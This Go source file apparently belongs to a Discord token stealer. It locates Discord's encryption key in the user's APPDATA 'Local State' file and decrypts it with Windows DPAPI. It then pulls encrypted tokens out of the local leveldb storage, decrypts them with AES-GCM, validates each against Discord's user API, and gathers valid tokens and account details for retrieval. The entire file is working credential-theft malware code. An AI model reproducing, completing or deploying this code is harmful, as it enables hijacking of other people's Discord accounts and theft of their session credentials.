package cryptograph

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"

	"github.com/billgraziano/dpapi"
)

type User struct {
	Token string
	User  map[string]interface{}
}

var tokenArr []User

func GetTokens() []User {
	return tokenArr
}

func findEncryptionKey() []byte {
	tokenArr = nil
	roaming := os.Getenv("APPDATA")
	dat, err := os.ReadFile(roaming + "\\discord\\Local State")
	var bolA map[string]interface{}

	json.Unmarshal(dat, &bolA)

	var encoded2 string = bolA["os_crypt"].(map[string]interface{})["encrypted_key"].(string)

	encoding, err := base64.StdEncoding.DecodeString(encoded2)
	encoding = encoding[5:]

	decrypted, _ := dpapi.DecryptBytes(encoding)

	if err != nil {
		fmt.Println(err)
	}

	return decrypted
}

func FindTokens() {
	roaming := os.Getenv("APPDATA")

	files, _ := os.ReadDir((roaming + "\\discord\\Local Storage\\leveldb"))

	decrypted := findEncryptionKey()

	for _, file := range files {
		name := file.Name()
		if !strings.HasSuffix(name, ".log") && !strings.HasSuffix(name, ".ldb") {
			continue
		}

		content, _ := os.ReadFile((roaming + "\\discord\\Local Storage\\leveldb\\") + name)

		lines := bytes.Split(content, []byte("\\n"))

		for _, line := range lines {
			searchEncryptedToken(line, decrypted)
		}
	}
}

func getRequest(url string, isChecking bool, token string) (body string, err error) {
	// Setup the Request
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json")
	// We are checking if the token is working
	if isChecking {
		req.Header.Set("Authorization", token)
	}

	if err != nil {
		return
	}

	client := &http.Client{}
	response, err := client.Do(req)

	if err != nil {
		return
	}

	if response.StatusCode != 200 {
		err = fmt.Errorf("GET %s Responded with status code: %d\n", url, response.StatusCode)
		return
	}

	defer response.Body.Close()

	b, err := io.ReadAll(response.Body)
	if err != nil {
		return
	}

	body = string(b)
	return
}

func tokenExists(arr []User, item string) bool {
	for i := 0; i < len(arr); i++ {
		if arr[i].User["id"].(string) == item {
			return true
		}
	}

	return false
}

func isTokenValid(token string) bool {

	// Check if the token is a valid discord token !
	body, err := getRequest("https://discord.com/api/v9/users/@me", true, token)

	if err != nil {
		fmt.Printf("Invalid Token: %s\n", err.Error())
		return false
	}

	var bodydecoded map[string]interface{}

	json.Unmarshal([]byte(body), &bodydecoded)

	if tokenExists(tokenArr, bodydecoded["id"].(string)) {
		return true
	}

	fmt.Printf("Valid Token !\n")

	bodyfull := &User{
		Token: token,
		User:  bodydecoded,
	}

	tokenArr = append(tokenArr, *bodyfull)

	return true
}

func searchEncryptedToken(line []byte, decrypted []byte) {

	var tokenRegex = regexp.MustCompile("dQw4w9WgXcQ:[^\"]*")

	for _, match := range tokenRegex.FindAll(line, -1) {

		baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
		token := decryptToken(string(baseToken), decrypted)

		isTokenValid(token)
		//dialog.Info(string(token))
	}
}

func decryptToken(token string, decrypted []byte) string {
	tokenslipted2, err := base64.StdEncoding.DecodeString(token)

	if err != nil {
		return string("")
	}

	var nonce = tokenslipted2[3:15]
	var encryptedValue = tokenslipted2[15:]

	block, err := aes.NewCipher(decrypted)
	if err != nil {
		return string("")
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return string("")
	}

	ivSize := len(nonce)
	if len(encryptedValue) < ivSize {
		return string("")
	}

	plaintext, err := aesgcm.Open(nil, nonce, encryptedValue, nil)
	if err != nil {
		return string("")
	}

	return string(plaintext)
}
